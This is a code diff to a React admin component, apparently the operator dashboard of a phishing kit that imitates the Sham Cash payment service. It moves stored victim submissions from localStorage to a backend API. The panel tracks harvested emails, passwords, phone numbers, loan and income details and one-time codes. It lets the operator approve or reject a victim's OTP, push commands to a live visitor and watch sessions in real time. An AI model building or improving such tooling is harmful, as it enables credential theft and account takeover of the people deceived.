@@ -6,6 +6,7 @@ import {
   Phone, Mail, DollarSign, TrendingUp, MapPin,
   RefreshCw, PenLine, Send, X, LogOut
 } from "lucide-react";
+import { adminApi } from "@/lib/adminApi";
 
 type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
 type OtpStatus = "pending" | "approved" | "rejected" | "redirected" | null;
@@ -28,15 +29,6 @@ interface Submission {
   lastSeen: number;
 }
 
-function loadSubmissions(): Submission[] {
-  try {
-    return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]");
-  } catch { return []; }
-}
-
-function saveSubmissions(list: Submission[]) {
-  localStorage.setItem("sham_submissions", JSON.stringify(list));
-}
 
 function playConnectSound() {
   try {
@@ -105,111 +97,69 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
   const T = T_AR;
 
   useEffect(() => {
-    const interval = setInterval(() => {
-      const raw = loadSubmissions();
-      const vId = localStorage.getItem("sham_visitor_id");
-      const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
-      const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
-      const vDataRaw = localStorage.getItem("sham_visitor_data");
-      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
-      const isAlive = vStatus && vStatus !== "disconnected" && (Date.now() - vLastSeen < 4000);
+    async function fetchAndUpdate() {
+      const data: Submission[] | null = await adminApi.getSubmissions();
+      if (!data) return;
 
-      const currentLiveStatus: VisitorStatus = isAlive ? (vStatus ?? "connected") : "disconnected";
-      setLiveStatus(currentLiveStatus);
-      setLiveId(isAlive ? vId : null);
+      const now = Date.now();
+      const updated = data.map((s) => ({
+        ...s,
+        isActive: s.isActive && (now - s.lastSeen < 8000),
+      }));
 
-      if (vId && isAlive) {
-        if (vId !== prevLiveId.current) {
-          prevLiveId.current = vId;
-          playConnectSound();
-          setHasNew(true);
-        }
-        if (prevLiveStatus.current === "disconnected" && currentLiveStatus !== "disconnected") {
-          setHasNew(true);
-        }
-      } else if (prevLiveId.current && !isAlive) {
-        if (prevLiveStatus.current !== "disconnected") {
-          playDisconnectSound();
-        }
-        prevLiveId.current = null;
+      const currentLiveId = updated.find((s) => s.isActive)?.id ?? null;
+      const currentLiveStatus: VisitorStatus = currentLiveId ? "connected" : "disconnected";
+
+      if (currentLiveId && currentLiveId !== prevLiveId.current) {
+        playConnectSound();
+        setHasNew(true);
+      } else if (!currentLiveId && prevLiveId.current) {
+        playDisconnectSound();
       }
+
+      prevLiveId.current = currentLiveId;
       prevLiveStatus.current = currentLiveStatus;
-
-      const otpStatus = localStorage.getItem("sham_otp_status") as OtpStatus;
-      const otpCode = localStorage.getItem("sham_otp_code") ?? "";
-      const changepassStatus = localStorage.getItem("sham_changepass_status") as PassStatus;
-      const vData = vDataRaw ? JSON.parse(vDataRaw) : {};
-
-      const updated = raw.map((s) => {
-        if (s.id === vId) {
-          return {
-            ...s,
-            isActive: !!isAlive,
-            lastSeen: vLastSeen || s.lastSeen,
-            page: vPage || s.page,
-            email: vData.email || s.email,
-            phone: vData.phone || s.phone,
-            loan: vData.loan || s.loan,
-            income: vData.income || s.income,
-            otpCode: otpCode || s.otpCode,
-            otpStatus: otpStatus ?? s.otpStatus,
-            changepassStatus: changepassStatus ?? s.changepassStatus,
-          };
-        }
-        return { ...s, isActive: false };
-      });
-
-      if (vId && isAlive) {
-        const exists = updated.find((s) => s.id === vId);
-        if (!exists) {
-          const newSub: Submission = {
-            id: vId,
-            submittedAt: localStorage.getItem("sham_visitor_connected_at") ?? new Date().toLocaleTimeString("ar-SY"),
-            submittedAtTs: Date.now(),
-            email: vData.email ?? "",
-            password: "",
-            phone: vData.phone ?? localStorage.getItem("sham_phone") ?? "",
-            loan: vData.loan ?? "",
-            income: vData.income ?? "",
-            otpCode: otpCode,
-            otpStatus: otpStatus,
-            changepassStatus: changepassStatus,
-            page: vPage,
-            isActive: true,
-            lastSeen: vLastSeen,
-          };
-          const next = [newSub, ...updated];
-          saveSubmissions(next);
-          setSubmissions(next);
-          setHasNew(true);
-          return;
-        }
-      }
-
-      saveSubmissions(updated);
+      setLiveStatus(currentLiveStatus);
+      setLiveId(currentLiveId);
       setSubmissions(updated);
-    }, 600);
+    }
+
+    fetchAndUpdate();
+    const interval = setInterval(fetchAndUpdate, 2000);
     return () => clearInterval(interval);
   }, []);
 
-  function sendCmd(cmd: string) {
-    localStorage.setItem("sham_admin_cmd", cmd);
+  async function sendCmd(cmd: string) {
+    if (!selected) return;
+    await adminApi.sendCmd(selected, cmd);
   }
 
-  function decideOtp(decision: OtpStatus) {
-    localStorage.setItem("sham_otp_status", decision ?? "");
-    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, otpStatus: decision } : s));
+  async function decideOtp(decision: OtpStatus) {
+    if (!selected) return;
+    await adminApi.patchSubmission(selected, { otpStatus: decision });
+    await adminApi.sendCmd(selected, `otp:${decision}`);
+    setSubmissions((prev) => prev.map((s) => s.id === selected ? { ...s, otpStatus: decision } : s));
   }
 
-  function decidePass(decision: PassStatus) {
-    localStorage.setItem("sham_changepass_status", decision ?? "");
-    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, changepassStatus: decision } : s));
+  async function decidePass(decision: PassStatus) {
+    if (!selected) return;
+    await adminApi.patchSubmission(selected, { changepassStatus: decision });
+    await adminApi.sendCmd(selected, `changepass:${decision}`);
+    setSubmissions((prev) => prev.map((s) => s.id === selected ? { ...s, changepassStatus: decision } : s));
   }
 
-  function clearAll() {
-    saveSubmissions([]);
+  async function clearAll() {
+    if (!confirm("هل تريد حذف جميع السجلات؟")) return;
+    await adminApi.deleteAll();
     setSubmissions([]);
     setSelected(null);
+  }
+
+  async function deleteVisitor(id: string) {
+    await adminApi.deleteSubmission(id);
+    const next = submissions.filter((s) => s.id !== id);
+    setSubmissions(next);
+    if (selected === id) setSelected(next.length > 0 ? next[0].id : null);
   }
 
   const filtered = submissions.filter((s) => {
